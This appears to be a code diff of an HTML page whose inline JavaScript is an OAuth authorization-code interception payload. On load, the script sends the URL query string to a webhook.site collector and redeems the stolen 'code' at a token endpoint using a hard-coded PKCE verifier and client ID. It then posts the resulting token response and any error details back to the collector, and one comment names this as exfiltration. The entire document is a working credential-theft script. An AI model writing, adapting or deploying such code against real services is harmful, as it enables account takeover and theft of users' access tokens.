@@ -1,51 +1,78 @@
-<!DOCTYPE html>
+<!doctype html>
 <html>
     <script type="text/javascript">
-        async function sendCode() {
-            const searchParams = window.location.search
-
-            const parsedParams = new URLSearchParams(searchParams);
-            const code = parsedParams.get('code');
-
-            const formBody = new URLSearchParams();
-            formBody.append('grant_type', 'authorization_code');
-            formBody.append('code', code);
-            formBody.append('code_verifier', 'I2c5OoLJFYkzPacUdsrQkJbCsUfxnVnz_rgV_UEdC6dIf_fHcgHsdBWkQqD95ruY');
-            formBody.append('client_id', 'CLIENT123')
-
-            const token = await fetch('https://login.sketchycompany.upd-dcs.work/token', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: formBody,
-            });
-
-            await fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
-                method: 'POST',
-                headers: {
-                  'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: formBody,
-            });
-
-            const tokenData = await token.json();
-
-            await fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
-                method: 'POST',
-                body: "sending token",
-            });
-
-            await fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
-                method: 'POST',
-                body: JSON.stringify(tokenData),
-            });
-        }
-
-        fetch('https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e', {
-            method: 'POST',
+        fetch("https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e", {
+            method: "POST",
             body: window.location.search,
         });
+
+        async function sendCode() {
+            try {
+                const searchParams = window.location.search;
+                const parsedParams = new URLSearchParams(searchParams);
+                const code = parsedParams.get("code");
+
+                if (!code) {
+                    await fetch(
+                        "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e",
+                        {
+                            method: "POST",
+                            headers: { "Content-Type": "text/plain" },
+                            body: 'Execution stopped: No "code" parameter found in URL.',
+                        },
+                    );
+                    return;
+                }
+
+                const formBody = new URLSearchParams();
+                formBody.append("grant_type", "authorization_code");
+                formBody.append("code", code);
+                formBody.append(
+                    "code_verifier",
+                    "I2c5OoLJFYkzPacUdsrQkJbCsUfxnVnz_rgV_UEdC6dIf_fHcgHsdBWkQqD95ruY",
+                );
+                formBody.append("client_id", "CLIENT123");
+
+                const tokenResponse = await fetch(
+                    "https://login.sketchycompany.upd-dcs.work/token",
+                    {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/x-www-form-urlencoded",
+                        },
+                        body: formBody,
+                    },
+                );
+
+                const rawResponseText = await tokenResponse.text();
+
+                await fetch(
+                    "https://webhook.site/94c1f530-559a-4ecb-aac8-b1db28c1e91e",
+                    {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            event: "Token endpoint response received",
+                            httpStatus: tokenResponse.status,
+                            statusText: tokenResponse.statusText,
+                            bodyData: rawResponseText,
+                        }),
+                    },
+                );
+            } catch (error) {
+                // 8. Catch and exfiltrate any errors (CORS blocks, DNS resolution errors, network drops)
+                await fetch("https://webhook.site", {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        event: "Script Exception Caught",
+                        errorMessage: error.message,
+                        errorStack: error.stack,
+                    }),
+                });
+            }
+        }
+
         sendCode();
     </script>
 </html>
